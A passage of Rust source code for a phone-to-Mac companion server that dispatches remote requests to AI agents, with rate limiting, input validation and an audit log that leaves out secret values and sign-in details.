#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct SessionKeyParams {
    session_id: String,
    key: String,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct SendParams {
    agent_id: String,
    text: String,
    client_id: String,
    #[serde(default)]
    attachments: Vec<BlobParam>,
    #[serde(default)]
    mentions: Vec<String>,
    #[serde(default)]
    revises: Option<String>,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct RoomMessagesParams {
    room_id: String,
    limit: Option<usize>,
    before: Option<String>,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct RoomSendParams {
    room_id: String,
    text: String,
    client_id: String,
    #[serde(default)]
    mentions: Vec<String>,
    #[serde(default)]
    everyone: bool,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct RoomFocusParams {
    room_id: Option<String>,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct ApprovalParams {
    agent_id: String,
    request_id: String,
    allow: bool,
    always: Option<bool>,
    note: Option<String>,
    choice: Option<usize>,
}

/// Never echoed: a parse error could quote a value, so a malformed request
/// gets a fixed sentence instead (see `"agents.saveSecret"`).
#[derive(Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
struct SecretParams {
    agent_id: String,
    request_id: String,
    values: Vec<String>,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct MemoryChangeParams {
    agent_id: String,
    change: Value,
}

#[derive(Deserialize)]
struct TextParam {
    text: String,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct FocusParams {
    agent_id: Option<String>,
}

/// What the audit log records about a call: a preview of anything typed.
pub fn audit_detail(method: &str, params: &Value) -> String {
    let field = |k: &str| params.get(k).and_then(Value::as_str).unwrap_or("");
    let preview = crate::remote_access::preview;
    match method {
        "agents.send" | "sessions.send" => preview(field("text")),
        "rooms.send" => preview(&format!("in a room: {}", field("text"))),
        "rooms.focus" => field("roomId").to_string(),
        "sessions.key" => format!("pressed {}", field("key")),
        "agents.memorySuggest" => format!(
            "suggest a memory from {} chars",
            field("text").chars().count()
        ),
        "agents.update" => {
            let input = params.get("input").cloned().unwrap_or(Value::Null);
            let flag = |k: &str, on: &str, off: &str| match input.get(k).and_then(Value::as_bool) {
                Some(true) => Some(on.to_string()),
                Some(false) => Some(off.to_string()),
                None => None,
            };
            [
                flag("pinned", "pin", "unpin"),
                flag("muted", "mute", "unmute"),
                flag("hidden", "hide", "unhide"),
                input
                    .get("instructions")
                    .and_then(Value::as_str)
                    .map(|i| format!("edit instructions ({} chars)", i.chars().count())),
            ]
            .into_iter()
            .flatten()
            .chain(std::iter::once(field("agentId").to_string()))
            .collect::<Vec<_>>()
            .join(" ")
        }
        "agents.create" => {
            let input = params.get("input").cloned().unwrap_or(Value::Null);
            let text = |k: &str| {
                input
                    .get(k)
                    .and_then(Value::as_str)
                    .unwrap_or("")
                    .trim()
                    .to_string()
            };
            match text("role").as_str() {
                "" => preview(&format!("create {}", text("name"))),
                role => preview(&format!("create {} — {role}", text("name"))),
            }
        }
        "agents.answerApproval" => {
            let allow = params
                .get("allow")
                .and_then(Value::as_bool)
                .unwrap_or(false);
            let always = params
                .get("always")
                .and_then(Value::as_bool)
                .unwrap_or(false);
            let note = field("note").trim();
            if let Some(choice) = params.get("choice").and_then(Value::as_u64) {
                return format!("picked option {}", choice + 1);
            }
            match (allow, always, note.is_empty()) {
                (true, true, _) => "always allow".into(),
                (true, false, _) => "allow".into(),
                (false, _, true) => "deny".into(),
                (false, _, false) => preview(&format!("deny with note: {note}")),
            }
        }
        // Names the card, never a value: `values` is not read here.
        "agents.saveSecret" => format!("saved a secret for {}", field("agentId")),
        "agents.loginStart" => format!(
            "started signing in ({}) for {}",
            field("optionId"),
            field("agentId")
        ),
        "agents.loginCancel" => format!("stopped signing in for {}", field("agentId")),
        "agents.loginsConnect" => format!(
            "connected {} ({}) for the team",
            field("key"),
            field("optionId")
        ),
        "agents.loginDismiss" => format!("not needed: a login for {}", field("agentId")),
        "agents.loginNotNeeded" => {
            format!("chose not to connect an app {} asked for", field("agentId"))
        }
        "agents.loginsNotNeeded" => match params.get("keys").and_then(Value::as_array) {
            Some(keys) => format!(
                "chose not to connect {}",
                keys.iter()
                    .filter_map(Value::as_str)
                    .collect::<Vec<_>>()
                    .join(", ")
            ),
            None => "skipped the rest of the team's logins".into(),
        },
        "agents.loginsUndecline" => "turned a declined app back on".into(),
        "agents.loginDecline" => format!("declined a login for {}", field("agentId")),
        // Never the sign-in's URL or its code: only that it happened.
        "agents.loginPhoneBegin" => format!(
            "started signing in on the phone ({}) for {}",
            field("optionId"),
            if field("key").is_empty() {
                field("agentId")
            } else {
                field("key")
            }
        ),
        "agents.loginPhoneFinish" => "finished signing in on the phone".into(),
        // Never read: what's typed there is a password.
        m if SELF_AUDITED_METHODS.contains(&m) => "phone sign-in".into(),
        // Never the value.
        "agents.loginSaveKey" => format!("saved a key for {}", field("agentId")),
        "agents.memoryChange" => {
            let change = params.get("change").cloned().unwrap_or(Value::Null);
            let text = change.get("text").and_then(Value::as_str).unwrap_or("");
            match change.get("op").and_then(Value::as_str).unwrap_or("") {
                "add" => preview(&format!("remember: {text}")),
                "edit" => preview(&format!("edit memory: {text}")),
                "delete" => format!(
                    "forget memory entry {}",
                    change
                        .get("index")
                        .map(Value::to_string)
                        .unwrap_or_default()
                ),
                other => format!("memory {other}"),
            }
        }
        "devices.unpairSelf" => "forgot this Mac".into(),
        "devices.setPush" => match params.get("token").and_then(Value::as_str) {
            Some(_) => "push token set".into(),
            None => "push token cleared".into(),
        },
        "agents.fetchPath" => preview(field("path")),
        "agents.revokePermission" => format!("revoke {} {}", field("ruleId"), field("agentId")),
        "agents.teamSetup.step" => format!("setup: {} {}", field("step"), field("state")),
        "agents.teamSetup.later" => format!("setup: {} {}", field("action"), field("key")),
        "agents.teamSetup.check" => "setup: check what the team can reach".into(),
        "agents.teamSetup.routine" => {
            let on = params.get("on").and_then(Value::as_bool) == Some(true);
            format!(
                "setup: switch {} {} {}",
                if on { "on" } else { "off" },
                field("checkInId"),
                field("agentId")
            )
        }
        "agents.teamSetup.hello" => format!("setup: said hi to {}", field("agentId")),
        "agents.teamSetup.missing" => "setup: asked the Chief about what's missing".into(),
        "agents.teamSetup.dismiss" => "setup: put away".into(),
        "sessions.start" => preview(&format!("{} — {}", field("project"), field("prompt"))),
        "preview.screenshot" => format!("{} {}", field("project"), field("device")),
        "agents.schedule.create" | "agents.schedule.update" => {
            preview(&format!("{} — {}", field("when"), field("note")))
        }
        "agents.schedule.pause" => {
            let paused = params.get("paused").and_then(Value::as_bool) == Some(true);
            format!(
                "{} {}",
                if paused { "pause" } else { "resume" },
                field("id")
            )
        }
        "agents.schedule.cancel" | "agents.schedule.runNow" => field("id").to_string(),
        "agents.setDefaults" => {
            let said: Vec<String> = [
                ("engine", "engine"),
                ("claudeModel", "Claude Code model"),
                ("codexModel", "Codex model"),
            ]
            .into_iter()
            .filter(|(key, _)| params.get(*key).is_some())
            .map(|(key, name)| match field(key) {
                "" => format!("{name} default"),
                value => format!("{name} {}", preview(value)),
            })
            .collect();
            format!("new agents: {}", said.join(", "))
        }
        "agents.setIndependence" => format!("independence: {}", preview(field("level"))),
        "agents.setImportChoice" => format!("import: {}", preview(field("choice"))),
        "agents.setAdmin" => format!(
            "{} admin {}",
            field("agentId"),
            if params.get("admin").and_then(Value::as_bool) == Some(true) {
                "on"
            } else {
                "off"
            }
        ),
        _ => field("agentId").to_string(),
    }
}

/// A phone sign-in request, parsed. A refusal says what's wrong with it,
/// never what was typed.
fn signin_op(method: &str, params: Value) -> Result<crate::agents::phone_signin::Op, WireError> {
    use crate::agents::phone_signin::Op;
    let id = |s: &str| -> Result<(), WireError> {
        if s.is_empty() || s.len() > 100 {
            return Err(bad_params("Which sign-in?"));
        }
        Ok(())
    };
    Ok(match method {
        "agents.signinBegin" => {
            let p: SigninBeginParams = parse(params)?;
            id(&p.agent_id)?;
            id(&p.request_id)?;
            Op::Begin {
                agent_id: p.agent_id,
                request_id: p.request_id,
            }
        }
        "agents.signinInput" => {
            let p: SigninInputParams =
                parse(params).map_err(|_| bad_params("That isn't something the page can take."))?;
            id(&p.session_id)?;
            Op::Input {
                session_id: p.session_id,
                input: p.input,
            }
        }
        _ => {
            let p: SigninParams = parse(params)?;
            id(&p.session_id)?;
            match method {
                "agents.signinFrame" => Op::Frame {
                    session_id: p.session_id,
                },
                "agents.signinDone" => Op::Done {
                    session_id: p.session_id,
                    anyway: p.anyway,
                },
                _ => Op::Stop {
                    session_id: p.session_id,
                },
            }
        }
    })
}

/// Run one request, with the rate limit and the audit line around it.
pub async fn dispatch(
    c: &Companion,
    caller: &Caller,
    method: &str,
    params: Value,
) -> Result<Value, WireError> {
    if !METHODS.contains(&method) {
        return Err(WireError::protocol(
            ProtocolCode::UnknownMethod,
            format!("This Mac doesn't know {method}."),
        ));
    }
    if !c.allow_request(&caller.device_id, now_ms()) {
        return Err(WireError::protocol(
            ProtocolCode::RateLimited,
            "Too many requests. Try again in a minute.",
        ));
    }
    let detail = audit_detail(method, &params);
    let result = run(c, caller, method, params).await;
    if !READ_ONLY_METHODS.contains(&method) && !SELF_AUDITED_METHODS.contains(&method) {
        let (detail, ok) = match &result {
            Ok(_) => (detail, true),
            Err(e) => (
                crate::remote_access::preview(&format!("{detail} — refused: {}", e.summary())),
                false,
            ),
        };
        c.backend
            .audit(&actor_for(&caller.device_name), method, detail, ok);
    }
    result
}

async fn run(
    c: &Companion,
    caller: &Caller,
    method: &str,
    params: Value,
) -> Result<Value, WireError> {
    let b = &c.backend;
    match method {
        "system.status" => Ok(to_value(&refresh_status(c).await)),
        "devices.self" => c
            .registry
            .get(&caller.device_id)
            .map(|d| to_value(&d.view(true)))
            .ok_or_else(|| CommandError::expected("This phone isn't paired any more.").into()),
        "devices.unpairSelf" => {
            let gone = c.registry.revoke(&caller.device_id)?;
            if let Some(d) = &gone {
                c.forget_push_later(d);
                b.changed();
            }
            Ok(Value::Null)
        }
        "devices.setPush" => {
            let p: SetPushParams = parse(params)?;
            let status = super::push::set_push(
                c,
                &caller.device_id,
                p.token,
                p.environment.unwrap_or_default(),
            )
            .await?;
            Ok(json!({ "status": status }))
        }
        "agents.overview" => Ok(b.overview().await?),
        "agents.messages" => {
            let p: MessagesParams = parse(params)?;
            // Read the cursor first: anything changed after it reaches the
            // phone as an event with a higher seq, which the merge keeps.
            let as_of = c.hub.cursor();
            let limit = p.limit.unwrap_or(MESSAGES_DEFAULT).clamp(1, MESSAGES_MAX);
            let (messages, more) = b.messages(&p.agent_id, limit, p.before.as_deref()).await?;
            Ok(json!({ "messages": messages, "asOf": as_of, "more": more }))
        }
        "agents.send" => {
            let p: SendParams = parse(params)?;
            let client_id = p.client_id.trim().to_string();
            if client_id.is_empty() || client_id.len() > 128 {
                return Err(bad_params("clientId is required (at most 128 characters)."));
            }
            let key = format!("{}:{client_id}", caller.device_id);
            let device = caller.device_id.clone();
            c.sends
                .once(key, now_ms(), || async move {
                    let blob_ids: Vec<String> =
                        p.attachments.into_iter().map(|a| a.blob_id).collect();
                    let attachments = staged(c, &device, &blob_ids)?;
                    // Files alone are a message, as on the desk; any text
                    // still gets Remote Access's refusals.
                    let text = if attachments.is_empty() || !p.text.trim().is_empty() {
                        crate::remote_access::tools::clean_agent_text(&p.text, "message")
                            .map_err(|reason| WireError::protocol(ProtocolCode::Refused, reason))?
                    } else {
                        String::new()
                    };
                    let extras = SendExtras {
                        mentions: p.mentions,
                        attachments,
                        client_id: Some(client_id),
                        revises: p.revises.filter(|r| !r.trim().is_empty()),
                    };
                    let sent = b.send(&p.agent_id, text, extras).await?;
                    c.blobs.consume(&blob_ids);
                    Ok(sent)
                })
                .await
        }
        "rooms.list" => Ok(b.rooms().await?),
        "rooms.messages" => {
            let p: RoomMessagesParams = parse(params)?;
            let as_of = c.hub.cursor();
            let limit = p.limit.unwrap_or(MESSAGES_DEFAULT).clamp(1, MESSAGES_MAX);
            let (messages, more) = b
                .room_messages(&p.room_id, limit, p.before.as_deref())
                .await?;
            Ok(json!({ "messages": messages, "asOf": as_of, "more": more }))
        }
        "rooms.send" => {
            let p: RoomSendParams = parse(params)?;
            let client_id = p.client_id.trim().to_string();
            if client_id.is_empty() || client_id.len() > 128 {
                return Err(bad_params("clientId is required (at most 128 characters)."));
            }
            let key = format!("{}:room:{client_id}", caller.device_id);
            c.sends
                .once(key, now_ms(), || async move {
                    // The same refusals as a message to one agent.
                    let text = crate::remote_access::tools::clean_agent_text(&p.text, "message")
                        .map_err(|reason| WireError::protocol(ProtocolCode::Refused, reason))?;
                    let send = RoomSend {
                        mentions: p.mentions,
                        everyone: p.everyone,
                        client_id: Some(client_id),
                    };
                    Ok(b.room_send(&p.room_id, text, send).await?)
                })
                .await
        }
        "rooms.focus" => {
            let p: RoomFocusParams = parse(params)?;
            b.room_focus(&caller.label, p.room_id).await?;
            Ok(Value::Null)
        }
        "agents.stop" => {
            let p: AgentParam = parse(params)?;
            Ok(Value::Bool(b.stop(&p.agent_id).await?))
        }
        "agents.interrupt" => {
            let p: AgentParam = parse(params)?;
            Ok(Value::Bool(b.interrupt(&p.agent_id).await?))
        }
        "agents.stopStep" => {
            let p: AgentParam = parse(params)?;
            Ok(Value::String(b.stop_step(&p.agent_id).await?))
        }
        "agents.checkOn" => {
            let p: AgentParam = parse(params)?;
            Ok(Value::String(b.check_on(&p.agent_id).await?))
        }
        "agents.answerApproval" => {
            let p: ApprovalParams = parse(params)?;
            b.answer_approval(ApprovalAnswer {
                agent_id: p.agent_id,
                request_id: p.request_id,
                allow: p.allow,
                always: p.always,
                note: p.note,
                choice: p.choice,
            })
            .await?;
            Ok(Value::Null)
        }
        "agents.saveSecret" => {
            // No route check here: every socket reaches this server the same
            // way, so one could never fail. The phone's pinned-identity check
            // (docs/mobile.md, "Pairing") is what keeps secrets on this Mac.
            let p: SecretParams = parse(params).map_err(|_| {
                bad_params("A secret needs agentId, requestId and one value per field.")
            })?;
            if p.values.is_empty()
                || p.values.len() > MAX_SECRET_FIELDS
                || p.values
                    .iter()
                    .any(|v| v.chars().count() > MAX_SECRET_CHARS)
            {
                return Err(bad_params(
                    "That doesn't look like a secret this card asked for.",
                ));
            }
            Ok(b.save_secret(&p.agent_id, &p.request_id, p.values).await?)
        }
        "agents.memory" => {
            let p: AgentParam = parse(params)?;
            Ok(b.memory(&p.agent_id).await?)
        }
        "agents.memoryChange" => {
            let p: MemoryChangeParams = parse(params)?;
            let text = p.change.get("text").and_then(Value::as_str).unwrap_or("");
            if text.chars().count() > MAX_MEMORY_CHARS {
                return Err(bad_params(format!(
                    "A memory can be up to {MAX_MEMORY_CHARS} characters."
                )));
            }
            if text.chars().any(|c| c.is_control() && c != '\n') {
                return Err(WireError::protocol(
                    ProtocolCode::Refused,
                    "A memory can't contain control characters.",
                ));
            }
            Ok(b.memory_change(&p.agent_id, p.change).await?)
        }
        "agents.memorySuggest" => {
            let p: TextParam = parse(params)?;
            // Each one starts a model process: a few at once, whoever asks.
            let Some(_slot) = c
                .suggests
                .try_take("all", super::limits::MAX_SUGGESTS_AT_ONCE)
            else {
                return Err(WireError::protocol(
                    ProtocolCode::RateLimited,
                    "Your Mac is already suggesting a memory. Try again in a moment.",
                ));
            };
            let text: String = p.text.chars().take(MAX_SUGGEST_CHARS).collect();
            Ok(Value::String(b.memory_suggest(text).await?))
        }
        "agents.focus" => {
            let p: FocusParams = parse(params)?;
            b.focus(&caller.label, p.agent_id).await?;
            Ok(Value::Null)
        }
        "agents.markUnread" => {
            let p: AgentParam = parse(params)?;
            b.mark_unread(&p.agent_id).await?;
            Ok(Value::Null)
        }
        "agents.startFresh" => {
            let p: AgentParam = parse(params)?;
            // A `StoredAgent`, without lifetime usage, as `agents.update` returns.
            let mut stored = b.start_fresh(&p.agent_id).await?;
            if let Some(fields) = stored.as_object_mut() {
                fields.remove("usage");
            }
            Ok(stored)
        }
        "agents.create" => {
            let p: CreateParams = parse(params).map_err(|_| {
                bad_params(
                    "From the phone, a new agent takes a name, what it should do, a colour and a ready-made agent to start from.",
                )
            })?;
            let input = check_new_agent(p.input)?;
            let device = caller.device_id.clone();
            let create = || async move {
                // Counted here, so a retry answered from the cache isn't a second agent.
                if !c.allow_create(&device, now_ms()) {
                    return Err(WireError::protocol(
                        ProtocolCode::RateLimited,
                        format!(
                            "That's {} new agents in a minute, the most a phone can make. Try again in a minute.",
                            super::MAX_AGENTS_CREATED_PER_MINUTE
                        ),
                    ));
                }
                // A `StoredAgent`, without lifetime usage, as `agents.update` returns.
                let mut stored = b.create_agent(input).await?;
                if let Some(fields) = stored.as_object_mut() {
                    fields.remove("usage");
                }
                Ok(stored)
            };
            match p.client_id.map(|id| id.trim().to_string()) {
                None => create().await,
                Some(id) if id.is_empty() || id.len() > 128 => {
                    Err(bad_params("clientId is at most 128 characters."))
                }
                // A retry after a dropped socket gets the agent the first one
                // made, not a second (or "There's already an agent called …").
                Some(id) => {
                    c.sends
                        .once(
                            format!("{}:create:{id}", caller.device_id),
                            now_ms(),
                            create,
                        )
                        .await
                }
            }
        }
        "agents.update" => {
            let p: UpdateParams = parse(params).map_err(|_| {
                bad_params(
                    "Only pin, mute, hide, the instructions and how it looks can be changed from the phone.",
                )
            })?;
            if p.input == AgentToggles::default() {
                return Err(bad_params("Nothing to change."));
            }
            if p.input
                .instructions
                .as_ref()
                .is_some_and(|i| i.chars().count() > MAX_INSTRUCTIONS)
            {
                return Err(bad_params(format!(
                    "Instructions can be up to {MAX_INSTRUCTIONS} characters."
                )));
            }
            if let Some(i) = &p.input.instructions {
                refuse_unsafe_text(i, "Instructions")?;
            }
            let mut p = p;
            p.input.avatar = check_look(p.input.avatar.take())?;
            if let Some(c) = p.input.color.as_deref().map(str::trim) {
                if !crate::agents::store::COLORS.contains(&c) {
                    return Err(bad_params(format!("{c} isn't one of the agent colours.")));
                }
            }
            // `StoredAgent` doesn't carry lifetime usage, as the overview doesn't.
            let mut stored = b.update_agent(&p.agent_id, p.input).await?;
            if let Some(fields) = stored.as_object_mut() {
                fields.remove("usage");
            }
            Ok(stored)
        }
        "agents.files" => {
            let p: AgentParam = parse(params)?;
            Ok(b.files(&p.agent_id).await?)
        }
        "agents.instructions" => {
            let p: AgentParam = parse(params)?;
            Ok(Value::String(b.instructions(&p.agent_id).await?))
        }
        "agents.usage" => {
            let p: AgentParam = parse(params)?;
            Ok(b.usage(&p.agent_id).await?)
        }
        "agents.quota" => Ok(b.quota().await?),
        "agents.setDefaults" => {
            let change: crate::agents::defaults::Change = parse(params).map_err(|_| {
                bad_params(
                    "New agents' defaults take an engine (claude or codex), claudeModel and codexModel.",
                )
            })?;
            if change.is_empty() {
                return Err(bad_params("Nothing to change."));
            }
            Ok(b.set_defaults(change).await?)
        }
        "agents.setIndependence" => {
            let level = params
                .get("level")
                .and_then(Value::as_str)
                .and_then(|l| crate::agents::independence::Level::parse(l).ok())
                .ok_or_else(|| {
                    bad_params(
                        "How independent agents are takes a level: often, judgement or go_hard.",
                    )
                })?;
            Ok(b.set_independence(level).await?)
        }
        "agents.setImportChoice" => {
            let choice = params
                .get("choice")
                .and_then(Value::as_str)
                .and_then(|c| crate::agents::import_choice::Choice::parse(c).ok())
                .ok_or_else(|| {
                    bad_params("The import choice is imported, declined or undecided.")
                })?;
            Ok(b.set_import_choice(choice).await?)
        }
        "agents.setAdmin" => {
            let agent_id = params.get("agentId").and_then(Value::as_str).unwrap_or("");
            let admin = params.get("admin").and_then(Value::as_bool);
            let Some(admin) = admin.filter(|_| !agent_id.is_empty()) else {
                return Err(bad_params(
                    "Admin takes an agentId and admin: true or false.",
                ));
            };
            Ok(b.set_admin(agent_id, admin).await?)
        }
        "agents.accounts" => Ok(b.accounts().await?),
        "agents.usagePlan" => Ok(b.usage_plan().await?),
        "agents.import.status" => Ok(b.import_status().await?),
        "agents.import.start" => Ok(b.import_start().await?),
        "agents.import.stop" => Ok(b.import_stop().await?),
        "agents.import.review" => {
            let p: ImportReviewParams = parse(params)?;
            if p.keys.len() > crate::agents::review::MAX_PROPOSALS {
                return Err(bad_params("That's more agents than one import holds."));
            }
            Ok(b.import_review(&p.agent_id, &p.request_id, p.keys).await?)
        }
        "agents.teamSetup" => {
            let p: TeamSetupGetParams = if params.is_null() {
                TeamSetupGetParams::default()
            } else {
                parse(params)?
            };
            Ok(b.team_setup(TeamSetupAction::Get { any: p.any }).await?)
        }
        "agents.teamSetup.step" => {
            let p: TeamSetupStepParams = parse(params).map_err(|_| {
                bad_params("A step is logins, routines, missing or hello; its state open, done or skipped.")
            })?;
            Ok(b.team_setup(TeamSetupAction::Step {
                step: p.step,
                state: p.state,
            })
            .await?)
        }
        "agents.teamSetup.routine" => {
            let p: TeamSetupRoutineParams = parse(params)?;
            Ok(b.team_setup(TeamSetupAction::Routine {
                agent_id: p.agent_id,
                check_in_id: p.check_in_id,
                on: p.on,
            })
            .await?)
        }
        "agents.teamSetup.hello" => {
            let p: AgentParam = parse(params)?;
            Ok(b.team_setup(TeamSetupAction::Hello {
                agent_id: p.agent_id,
            })
            .await?)
        }
        "agents.teamSetup.missing" => Ok(b.team_setup(TeamSetupAction::Missing).await?),
        "agents.teamSetup.dismiss" => Ok(b.team_setup(TeamSetupAction::Dismiss).await?),
        "agents.teamSetup.later" => {
            let p: TeamSetupLaterParams = parse(params)?;
            let connect = match p.action.as_str() {
                "connect" => true,
                "not_needed" => false,
                _ => return Err(bad_params("action is connect or not_needed.")),
            };
            Ok(b.team_setup(TeamSetupAction::Later {
                key: p.key,
                connect,
                on_phone: p.on_phone,
            })
            .await?)
        }
        "agents.teamSetup.check" => Ok(b.team_setup(TeamSetupAction::Check).await?),
        // The ready-made agents, without their briefings: the phone shows
        // the choice, the Mac fills the instructions in on create.
        "agents.templates" => Ok(templates_for_phone()),
        "agents.loginStart" => {
            let p: LoginParams = parse(params)?;
            if p.option_id.is_empty() || p.option_id.len() > 200 {
                return Err(bad_params(
                    "Which way in? optionId is one of the card's options.",
                ));
            }
            b.login_start(&p.agent_id, &p.request_id, &p.option_id, p.on_phone)
                .await?;
            Ok(Value::Null)
        }
        "agents.loginPhoneBegin" => {
            let p: PhoneBeginParams = parse(params)?;
            if p.option_id.is_empty() || p.option_id.len() > 200 || p.skip.len() > 200 {
                return Err(bad_params("Which card, and which way in?"));
            }
            let target = match (p.agent_id, p.request_id, p.key) {
                (Some(agent_id), Some(request_id), None) => {
                    crate::agents::login_relay::Target::Card {
                        agent_id,
                        request_id,
                    }
                }
                (None, None, Some(key)) if !key.is_empty() => {
                    crate::agents::login_relay::Target::Team { key, skip: p.skip }
                }
                _ => {
                    return Err(bad_params(
                        "Name one card (agentId, requestId) or one row (key).",
                    ))
                }
            };
            Ok(b.login_phone_begin(&caller.device_id, target, &p.option_id)
                .await?)
        }
        "agents.loginPhoneFinish" => {
            let p: PhoneFinishParams = parse(params)
                .map_err(|_| bad_params("A sign-in's answer needs flowId and callbackUrl."))?;
            if p.flow_id.is_empty() || p.flow_id.len() > 100 || p.callback_url.len() > 8192 {
                return Err(bad_params("That isn't a sign-in's answer."));
            }
            b.login_phone_finish(&caller.device_id, &p.flow_id, &p.callback_url)
                .await?;
            Ok(Value::Null)
        }
        m if SELF_AUDITED_METHODS.contains(&m) => {
            let op = signin_op(m, params)?;
            Ok(b.phone_signin(&caller.device_id, &caller.device_name, op)
                .await?)
        }
        "agents.loginCancel" => {
            let p: LoginParams = parse(params)?;
            b.login_cancel(&p.agent_id, &p.request_id).await?;
            Ok(Value::Null)
        }
        "agents.loginDecline" => {
            let p: LoginParams = parse(params)?;
            let note = p.note.map(|n| n.chars().take(500).collect::<String>());
            b.login_decline(&p.agent_id, &p.request_id, note).await?;
            Ok(Value::Null)
        }
        "agents.loginSaveKey" => {
            // As saveSecret: the phone's pinned-identity check keeps it on this Mac.
            let p: LoginKeyParams = parse(params)
                .map_err(|_| bad_params("A key needs agentId, requestId and value."))?;
            if p.value.trim().is_empty() || p.value.chars().count() > MAX_SECRET_CHARS {
                return Err(bad_params(
                    "That doesn't look like a key this card asked for.",
                ));
            }
            Ok(b.login_save_key(&p.agent_id, &p.request_id, p.value)
                .await?)
        }
        "agents.reach" => {
            let p: AgentParam = parse(params)?;
            Ok(b.reach(&p.agent_id).await?)
        }
        "agents.policy" => {
            let p: AgentParam = parse(params)?;
            Ok(b.policy(&p.agent_id).await?)
        }
        "agents.loginsTeam" => {
            let p: TeamParams = parse(params)?;
            Ok(b.logins_team(p.since).await?)
        }
        "agents.loginsConnect" => {
            let p: TeamConnectParams = parse(params)?;
            if p.key.is_empty() || p.option_id.is_empty() || p.skip.len() > 200 {
                return Err(bad_params("Which row, and which way in?"));
            }
            b.logins_connect(&p.key, &p.option_id, p.skip, p.on_phone)
                .await?;
            Ok(Value::Null)
        }
        "agents.loginDismiss" => {
            let p: LoginParams = parse(params)?;
            b.login_dismiss(&p.agent_id, &p.request_id).await?;
            Ok(Value::Null)
        }
        "agents.loginNotNeeded" => {
            let p: LoginParams = parse(params)?;
            Ok(b.login_not_needed(&p.agent_id, &p.request_id).await?)
        }
        "agents.loginsNotNeeded" => {
            let p: DeclineParams = parse(params)?;
            if p.keys
                .as_ref()
                .is_some_and(|k| k.is_empty() || k.len() > 200)
            {
                return Err(bad_params("Which rows?"));
            }
            Ok(b.logins_not_needed(p.keys).await?)
        }
        "agents.loginsUndecline" => {
            let p: DeclineParams = parse(params)?;
            let keys = p.keys.unwrap_or_default();
            if keys.is_empty() || keys.len() > 200 {
                return Err(bad_params("Which apps?"));
            }
            Ok(b.logins_undecline(keys).await?)
        }
        "agents.loginsRecheck" => {
            b.logins_recheck().await?;
            Ok(Value::Null)
        }
        "agents.revokePermission" => {
            let p: RuleParams = parse(params)?;
            b.revoke_permission(&p.agent_id, &p.rule_id).await?;
            Ok(Value::Null)
        }
        "agents.changeDiff" => {
            let p: DiffParams = parse(params)?;
            Ok(b.change_diff(&p.agent_id, &p.message_id, &p.path).await?)
        }
        "agents.keepCopy" => {
            let p: CopyParams = parse(params)?;
            Ok(b.keep_copy(&p.agent_id, &p.copy_id, p.into.as_deref())
                .await?)
        }
        "agents.discardCopy" => {
            let p: CopyParams = parse(params)?;
            b.discard_copy(&p.agent_id, &p.copy_id).await?;
            Ok(Value::Null)
        }
        "agents.watchLive" => {
            let p: WatchParams = parse(params)?;
            let (path, port) = b.watch_port(&p.agent_id, &p.message_id, p.link).await?;
            let base = b.watch_publish().await?;
            let (ticket, expires_at) = c.watch.mint(&caller.device_id, &path, port, now_ms());
            Ok(json!({
                "url": format!(
                    "{}{}{ticket}",
                    base.trim_end_matches('/'),
                    super::watch::ticket_prefix()
                ),
                "expiresAt": expires_at,
            }))
        }
        "agents.fetchPath" => {
            let p: PathParams = parse(params)?;
            let source = b.shareable_path(&p.agent_id, &p.path).await?;
            let blob = c.blobs.produce(&caller.device_id, &source, now_ms())?;
            Ok(to_value(&blob.as_ref()))
        }
        "agents.search" => {
            let p: QueryParams = parse(params)?;
            Ok(super::wire::search_for_app(
                b.search(p.query).await?,
                caller.shows,
            ))
        }
        "agents.schedule.preview" => {
            let p: WhenParams = parse(params)?;
            Ok(b.schedule(ScheduleOp::Preview { when: p.when }).await?)
        }
        "agents.schedule.create"
        | "agents.schedule.update"
        | "agents.schedule.pause"
        | "agents.schedule.cancel"
        | "agents.schedule.runNow" => {
            let p: ScheduleParams = parse(params)?;
            let needs_id = method != "agents.schedule.create";
            if needs_id && p.id.trim().is_empty() {
                return Err(bad_params("id is required."));
            }
            // The note is the prompt the routine sends later, with nobody
            // watching: the same rules as a message typed now.
            refuse_unsafe_text(&p.note, "A routine's note")?;
            let op = match method {
                "agents.schedule.create" => ScheduleOp::Create {
                    agent_id: p.agent_id,
                    when: p.when,
                    note: p.note,
                },
                "agents.schedule.update" => ScheduleOp::Update {
                    agent_id: p.agent_id,
                    id: p.id,
                    when: p.when,
                    note: p.note,
                },
                "agents.schedule.pause" => ScheduleOp::Pause {
                    agent_id: p.agent_id,
                    id: p.id,
                    paused: p.paused,
                },
                "agents.schedule.cancel" => ScheduleOp::Cancel {
                    agent_id: p.agent_id,
                    id: p.id,
                },
                _ => ScheduleOp::RunNow {
                    agent_id: p.agent_id,
                    id: p.id,
                },
            };
            Ok(b.schedule(op).await?)
        }
        "projects.list" => Ok(b.projects().await?),
        "sessions.read" => {
            let p: SessionParams = parse(params)?;
            Ok(b.session_screen(&p.session_id).await?)
        }
        "sessions.send" => {
            let p: SessionSendParams = parse(params)?;
            let client_id = p.client_id.trim().to_string();
            if client_id.is_empty() || client_id.len() > 128 {
                return Err(bad_params("clientId is required (at most 128 characters)."));
            }
            let key = format!("{}:session:{client_id}", caller.device_id);
            c.sends
                .once(key, now_ms(), || async move {
                    let text = crate::remote_access::tools::clean_agent_text(&p.text, "message")
                        .map_err(|reason| WireError::protocol(ProtocolCode::Refused, reason))?;
                    let session_id = b
                        .session_send(&p.project, p.session_id.as_deref(), &text)
                        .await?;
                    Ok(json!({ "sessionId": session_id }))
                })
                .await
        }
        "sessions.key" => {
            let p: SessionKeyParams = parse(params)?;
            if crate::remote_access::tools::key_bytes(&p.key).is_none() {
                return Err(WireError::protocol(
                    ProtocolCode::Refused,
                    format!("\"{}\" isn't a key the phone can press.", p.key),
                ));
            }
            b.session_key(&p.session_id, &p.key).await?;
            Ok(Value::Null)
        }
        "sessions.start" => {
            let p: SessionStartParams = parse(params)?;
            let client_id = p.client_id.trim().to_string();
            if client_id.is_empty() || client_id.len() > 128 {
                return Err(bad_params("clientId is required (at most 128 characters)."));
            }
            let key = format!("{}:start:{client_id}", caller.device_id);
